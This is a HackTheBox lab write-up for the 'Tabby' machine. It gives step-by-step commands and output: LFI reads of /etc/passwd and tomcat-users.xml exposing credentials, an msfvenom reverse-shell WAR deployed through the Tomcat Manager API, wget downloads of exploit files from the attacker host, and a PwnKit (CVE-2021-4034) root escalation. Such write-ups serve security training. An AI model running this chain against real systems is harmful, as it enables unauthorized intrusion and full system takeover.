# HackTheBox — Tabby

| Field | Details |
| --- | --- |
| Platform | HackTheBox |
| Machine | Tabby |
| Difficulty | Easy |
| OS | Linux (Ubuntu 20.04) |
| IP | 10.129.77.28 |
| Date | October 2026 |
| User Flag | `a8c9d1063614d10a0da7f24e8c33d8af` |
| Root Flag | `8ccd0718de7bbfa0b9cffbba0b7f0fb0` |

---

## Machine Summary

Tabby is an Easy-rated Linux machine that demonstrates how a simple local file inclusion (LFI) flaw can expose Tomcat Manager credentials and become remote code execution. The Mega Hosting application on port 80 exposes an unsanitized `file=` parameter. Reading `/etc/passwd` identifies the local users, while reading the Debian Tomcat configuration reveals a `manager-script` account. The Tomcat Manager text API accepts a WAR deployment using that role, providing a shell as `tomcat`.

The host runs vulnerable Polkit 0.105 with the SUID `pkexec` binary. A static build of the PwnKit exploit (CVE-2021-4034) avoids target glibc compatibility problems and elevates the `tomcat` shell to root.

**Skills demonstrated:**

- Service and virtual-host enumeration with Nmap and `/etc/hosts`
- Local File Inclusion testing and sensitive file extraction
- Tomcat role analysis and Manager Text API WAR deployment
- Reverse-shell handling and TTY stabilization
- Polkit/PwnKit vulnerability identification and static exploit compilation
- Linux privilege escalation and flag collection

---

## Attack Chain Summary

```
Nmap TCP → Apache (80), Tomcat (8080)
Add megahosting.htb → discover news.php?file=
LFI → /etc/passwd → users ash and tomcat
LFI → /usr/share/tomcat9/etc/tomcat-users.xml
  → tomcat:$3cureP4s5w0rd123! (manager-script)
Tomcat Manager Text API → deploy WAR → shell as tomcat
Polkit 0.105 + SUID pkexec → CVE-2021-4034 PwnKit
Static exploit + malicious shared object → root shell
Read /home/ash/user.txt and /root/root.txt
```

---

## Step 1 — Nmap TCP Scan

Begin with a targeted service scan to identify the exposed HTTP services.

```bash
Hackerpatel007_1@htb[/htb]$ nmap -sS -sV -sC -T4 -O -p 80,8080 -Pn -oA tabby 10.129.77.28
```

**Output:**

```
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Mega Hosting
|_http-server-header: Apache/2.4.41 (Ubuntu)
8080/tcp open  http    Apache Tomcat
|_http-title: Apache Tomcat
```

| Port | Service | Notes |
| --- | --- | --- |
| 80 | Apache httpd 2.4.41 | Mega Hosting application |
| 8080 | Apache Tomcat | Manager endpoints require authentication |

The main site is served through a virtual host. Add it before continuing with web enumeration:

```bash
Hackerpatel007_1@htb[/htb]$ echo "10.129.77.28 megahosting.htb" | sudo tee -a /etc/hosts
```

Browsing `http://megahosting.htb` reveals the Mega Hosting site. Its news page uses a filename parameter:

```
http://megahosting.htb/news.php?file=statement
```

The `file=` parameter is a strong LFI candidate.

---

## Step 2 — Confirm LFI and Enumerate Local Users

Test path traversal by requesting `/etc/passwd`:

```
http://megahosting.htb/news.php?file=../../../../../etc/passwd
```

**Relevant output:**

```
root:x:0:0:root:/root:/bin/bash
tomcat:x:997:997::/opt/tomcat:/bin/false
ash:x:1000:1000:clive:/home/ash:/bin/bash
```

The `ash` account is the expected user-flag owner. Tomcat is an application service account and becomes the primary foothold target.

---

## Step 3 — Extract Tomcat Manager Credentials

Tomcat user configuration differs by installation method. The Debian package location exposes the application credentials through the LFI:

```
http://megahosting.htb/news.php?file=../../../../usr/share/tomcat9/etc/tomcat-users.xml
```

**Output:**

```xml
<role rolename="admin-gui"/>
<role rolename="manager-script"/>
<user username="tomcat" password="$3cureP4s5w0rd123!" roles="admin-gui,manager-script"/>
```

| Username | Password | Relevant Role |
| --- | --- | --- |
| `tomcat` | `$3cureP4s5w0rd123!` | `manager-script` |

The account does not need `manager-gui` for code execution. The `manager-script` role authorizes the Tomcat Manager Text API, including WAR deployment.

---

## Step 4 — Deploy a WAR Reverse Shell

Generate a Java reverse shell packaged as a WAR archive:

```bash
Hackerpatel007_1@htb[/htb]$ msfvenom -p java/shell_reverse_tcp LHOST=10.10.16.36 LPORT=4444 -f war -o pwn.war
```

Start a listener:

```bash
Hackerpatel007_1@htb[/htb]$ nc -lvnp 4444
```

Deploy the WAR through the Manager Text API:

```bash
Hackerpatel007_1@htb[/htb]$ curl -u 'tomcat:$3cureP4s5w0rd123!' \
  --upload-file pwn.war \
  "http://10.129.77.28:8080/manager/text/deploy?path=/system&update=true"
```

**Output:**

```
OK - Deployed application at context path [/system]
```

Trigger the deployed application:

```
http://10.129.77.28:8080/system/pwn.war
```

**Shell:**

```
connect to [10.10.16.36] from (UNKNOWN) [10.129.77.28] 47670
tomcat@tabby:/var/lib/tomcat9$
```

Upgrade the shell for reliable interactive use:

```bash
tomcat@tabby:/var/lib/tomcat9$ python3 -c 'import pty; pty.spawn("/bin/bash")'
Hackerpatel007_1@htb[/htb]$ stty raw -echo; fg
tomcat@tabby:/var/lib/tomcat9$ export TERM=xterm
tomcat@tabby:/var/lib/tomcat9$ stty rows 38 columns 116
```

---

## Step 5 — Identify PwnKit (CVE-2021-4034)

Privilege enumeration identifies a SUID `pkexec` binary running vulnerable Polkit 0.105:

```
-rwsr-xr-x 1 root root 31032 Aug 16  2019 /usr/bin/pkexec

[!!!] CVE-2021-4034 PwnKit [conf:CRITICAL | any local user → root]:
      polkit 0.105 VULNERABLE (<0.120)
```

CVE-2021-4034 is an out-of-bounds write in `pkexec` argument handling. An attacker can use a crafted environment to load a controlled shared object with SUID-root privileges.

A common dynamic PoC failed due to a target glibc compatibility error. Compile the driver statically and compile the malicious shared object:

```bash
Hackerpatel007_1@htb[/htb]$ gcc -static exploit.c -o exploit
Hackerpatel007_1@htb[/htb]$ gcc -shared -fPIC evil-so.c -o evil.so
Hackerpatel007_1@htb[/htb]$ python3 -m http.server 8000
```

Transfer both files to the target:

```bash
tomcat@tabby:/tmp$ wget http://10.10.16.36:8000/exploit
tomcat@tabby:/tmp$ wget http://10.10.16.36:8000/evil.so
tomcat@tabby:/tmp$ ldd exploit
        not a dynamic executable
```

A static binary avoids runtime dependencies on the target's glibc version.

---

## Step 6 — PwnKit Privilege Escalation

Run the exploit:

```bash
tomcat@tabby:/tmp$ chmod +x exploit
tomcat@tabby:/tmp$ ./exploit
root@tabby:/tmp#
```

The exploit intentionally launches a minimal environment. Restore the standard command path:

```bash
root@tabby:/tmp# export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

Verify access:

```bash
root@tabby:/tmp# id
uid=0(root) gid=0(root) groups=0(root)
```

---

## Step 7 — Capture Flags

```bash
root@tabby:/tmp# cat /home/ash/user.txt
a8c9d1063614d10a0da7f24e8c33d8af

root@tabby:/tmp# cat /root/root.txt
8ccd0718de7bbfa0b9cffbba0b7f0fb0
```

| Flag | Value |
| --- | --- |
| User | `a8c9d1063614d10a0da7f24e8c33d8af` |
| Root | `8ccd0718de7bbfa0b9cffbba0b7f0fb0` |

---

## Lessons Learned

- **Test filename-like parameters first.** Values such as `file=`, `page=`, and `path=` are high-value path-traversal candidates. A successful `/etc/passwd` read turns the web application into a filesystem-read primitive.
- **Tomcat roles need context.** `manager-script` is sufficient for WAR deployment through `/manager/text/`, even when browser access to `/manager/html` is unavailable.
- **Treat configuration files as credential stores.** `tomcat-users.xml` frequently contains plaintext Manager credentials; package-specific paths matter during LFI enumeration.
- **Check Polkit early after gaining a local shell.** A SUID `pkexec` paired with a vulnerable Polkit release can provide direct root access.
- **Static compilation solves common exploit portability problems.** A statically linked exploit avoids target glibc-version incompatibilities, which is particularly useful for older systems.

---

## Full Attack Chain Reference

```
1. nmap -sS -sV -sC -T4 -O -p 80,8080 -Pn -oA tabby 10.129.77.28
   → Apache 2.4.41 on 80; Tomcat on 8080

2. echo "10.129.77.28 megahosting.htb" | sudo tee -a /etc/hosts
   → Virtual host registered

3. Browse /news.php?file=../../../../../etc/passwd
   → LFI confirmed; ash and tomcat users identified

4. Browse /news.php?file=../../../../usr/share/tomcat9/etc/tomcat-users.xml
   → tomcat:$3cureP4s5w0rd123! with manager-script

5. msfvenom -p java/shell_reverse_tcp LHOST=<LHOST> LPORT=4444 -f war -o pwn.war
   → Java reverse-shell WAR generated

6. curl -u 'tomcat:<password>' --upload-file pwn.war \
   "http://<IP>:8080/manager/text/deploy?path=/system&update=true"
   → WAR deployed

7. Trigger /system/pwn.war
   → Shell as tomcat

8. Identify vulnerable Polkit 0.105 / SUID pkexec
   → CVE-2021-4034 PwnKit

9. Compile a static PwnKit driver and evil shared object; transfer to /tmp
   → ./exploit → root shell

10. cat /home/ash/user.txt
    → User flag

11. cat /root/root.txt
    → Root flag
```

---

## Commands Reference

| Command | Purpose |
| --- | --- |
| `nmap -sS -sV -sC -T4 -O -p 80,8080 -Pn -oA tabby <IP>` | Service and version scan |
| `echo "<IP> megahosting.htb" | sudo tee -a /etc/hosts` | Add application virtual host |
| `news.php?file=../../../../../etc/passwd` | Confirm LFI and enumerate users |
| `news.php?file=../../../../usr/share/tomcat9/etc/tomcat-users.xml` | Extract Tomcat Manager credentials |
| `msfvenom -p java/shell_reverse_tcp LHOST=<IP> LPORT=4444 -f war -o pwn.war` | Build Java reverse-shell WAR |
| `curl -u 'tomcat:<password>' --upload-file pwn.war "http://<IP>:8080/manager/text/deploy?path=/system&update=true"` | Deploy WAR through Tomcat Manager Text API |
| `python3 -c 'import pty; pty.spawn("/bin/bash")'` | Upgrade shell to PTY |
| `gcc -static exploit.c -o exploit` | Build portable PwnKit driver |
| `gcc -shared -fPIC evil-so.c -o evil.so` | Build malicious shared object |
| `ldd exploit` | Confirm static linkage |
| `chmod +x exploit && ./exploit` | Execute PwnKit escalation |
| `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin` | Restore a complete root-shell PATH |

---

## MITRE ATT&CK Mapping

| Tactic | Technique | Detail |
| --- | --- | --- |
| Reconnaissance | T1595.001 — Active Scanning | Nmap scan identified Apache and Tomcat |
| Initial Access | T1190 — Exploit Public-Facing Application | LFI in `news.php?file=` |
| Credential Access | T1552.001 — Credentials in Files | Tomcat credentials extracted from `tomcat-users.xml` |
| Persistence / Execution | T1505.003 — Web Shell | WAR reverse shell deployed through Tomcat Manager |
| Execution | T1059.004 — Unix Shell | Interactive shell obtained as `tomcat` |
| Privilege Escalation | T1068 — Exploitation for Privilege Escalation | CVE-2021-4034 PwnKit |
| Privilege Escalation | T1548.001 — Setuid and Setgid | SUID `pkexec` was used by the exploit |
| Command and Control | T1105 — Ingress Tool Transfer | HTTP server used to transfer the static exploit files |
